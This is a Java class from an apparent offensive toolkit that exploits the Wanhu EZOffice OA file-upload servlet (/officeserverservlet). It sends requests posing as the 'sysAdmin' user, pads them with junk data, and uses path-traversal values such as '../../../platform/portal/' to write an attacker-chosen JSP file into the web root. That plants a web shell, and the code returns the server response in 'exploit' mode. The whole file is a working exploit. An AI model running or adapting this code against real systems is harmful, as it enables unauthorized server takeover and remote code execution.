package com.droplab.Controller.EZOffice.Service;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.util.HashMap;
import java.util.Iterator;

import static com.droplab.Controller.EZOffice.Common.Utils.getPayload;

/**
 * 万户OA金格office组件上传
 */
public class EZOfficeOfficeServerServlet extends BugService {
    private final String contentPath = "/officeserverservlet";

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = "";
                String filepath = null;
                String mOption = "";
                String filename = "";
                int count = 100;   //用于生成脏数据
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("mOption")) {
                        mOption = params.get(key);
                    } else if (key.equals("count")) {
                        count = Integer.parseInt(params.get(key));
                    } else if (key.equals("filename")) {
                        filename = params.get(key);
                    }
                }
                String payload = null;
                switch (mOption) {
                    case "SAVEFILE":
                        HashMap hashMap = new HashMap();
                        hashMap.put("OPTION", mOption);
                        hashMap.put("isDoc", "true");
                        hashMap.put("moduleType", "dossier");
                        hashMap.put("USERNAME", "sysAdmin");
                        hashMap.put("FILETYPE", "/../" + filename + ".jsp");
                        hashMap.put("docName", "../../../platform/portal/");
                        break;
                    case "SAVEPDF":
                        HashMap SAVEPDFMAP = new HashMap();
                        SAVEPDFMAP.put("OPTION", mOption);
                        SAVEPDFMAP.put("USERNAME", "sysAdmin");
                        SAVEPDFMAP.put("pdfpz", "1");
                        SAVEPDFMAP.put("tempfilename", "../../../platform/portal/" + filename + ".jsp");
                        payload = getPayload(SAVEPDFMAP, filepath, count);
                        break;
                    default:
                        HashMap DATETIMEMAP = new HashMap();
                        DATETIMEMAP.put("OPTION","DATETIME");
                        DATETIMEMAP.put("USERNAME", "sysAdmin");
                        payload = getPayload(DATETIMEMAP,"./"+filename+".dhp",0);
                        break;
                }
                if (!url.equals("") && !type.equals("") && payload != null) {
                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);
                    headers.put("Accept", "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8");
                    Connection.Response response = HttpUtils.post(url + contentPath, headers, payload);
                    if (type.equals("exploit")) {
                        return response;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
